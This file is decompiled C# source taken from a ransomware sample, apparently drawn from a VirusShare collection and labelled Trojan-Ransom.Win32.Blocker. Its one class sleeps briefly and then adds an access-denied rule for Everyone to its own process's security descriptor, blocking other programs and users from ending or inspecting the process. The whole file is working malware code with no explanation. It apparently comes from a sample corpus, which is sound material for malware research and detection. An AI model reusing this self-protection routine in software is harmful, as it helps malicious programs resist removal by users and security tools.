// Decompiled with JetBrains decompiler
// Type: EEqualsElevate
// Assembly: PiL, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BDEA68F-63DD-47EB-BCB7-0924CE9DFB5C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.fbrr-37e45b2af149731593dd0149c1e3917f9a467dd99af85c00cb1ef090d9d65d03.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

[StandardModule]
internal sealed class EEqualsElevate
{
  public class EEqualsElevation
  {
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetKernelObjectSecurity(
      IntPtr Handle,
      int securityInformation,
      [Out] byte[] pSecurityDescriptor,
      uint nLength,
      ref uint lpnLengthNeeded);

    private static T SalKomList<T>(ref T L, T M)
    {
      T obj;
      try
      {
        L = M;
        obj = M;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = default (T);
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static void SalKomSecurity(IntPtr SalKomXPh, RawSecurityDescriptor SalKomXD)
    {
      try
      {
        byte[] numArray = new byte[checked (SalKomXD.BinaryLength - 1 + 1)];
        SalKomXD.GetBinaryForm(numArray, 0);
        if (!EEqualsElevate.EEqualsElevation.SetKernelObjectSecurity(SalKomXPh, 4, numArray))
          throw new Win32Exception();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static RawSecurityDescriptor SalKomSecurity2(IntPtr XPh)
    {
      RawSecurityDescriptor securityDescriptor;
      try
      {
        byte[] L = new byte[0];
        uint lpnLengthNeeded;
        EEqualsElevate.EEqualsElevation.GetKernelObjectSecurity(XPh, 4, L, 0U, ref lpnLengthNeeded);
        if (lpnLengthNeeded < 0U || lpnLengthNeeded > (uint) short.MaxValue)
          throw new Win32Exception();
        if (!EEqualsElevate.EEqualsElevation.GetKernelObjectSecurity(XPh, 4, EEqualsElevate.EEqualsElevation.SalKomList<byte[]>(ref L, new byte[checked ((int) ((long) lpnLengthNeeded - 1L) + 1)]), lpnLengthNeeded, ref lpnLengthNeeded))
          throw new Win32Exception();
        securityDescriptor = new RawSecurityDescriptor(L, 0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        securityDescriptor = (RawSecurityDescriptor) null;
        ProjectData.ClearProjectError();
      }
      return securityDescriptor;
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetKernelObjectSecurity(
      IntPtr Handle,
      int securityInformation,
      [In] byte[] pSecurityDescriptor);

    public static void EEqualsStart()
    {
      Thread.Sleep(5237);
      try
      {
        IntPtr currentProcess = EEqualsElevate.EEqualsElevation.GetCurrentProcess();
        RawSecurityDescriptor SalKomXD = EEqualsElevate.EEqualsElevation.SalKomSecurity2(currentProcess);
        SalKomXD.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        EEqualsElevate.EEqualsElevation.SalKomSecurity(currentProcess, SalKomXD);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [System.Flags]
    public enum SalKomEnum
    {
      SalKomSync = 256, // 0x00000100
      SalKomSrr = 983040, // 0x000F0000
      SalKomXPaa = 987135, // 0x000F0FFF
    }
  }
}
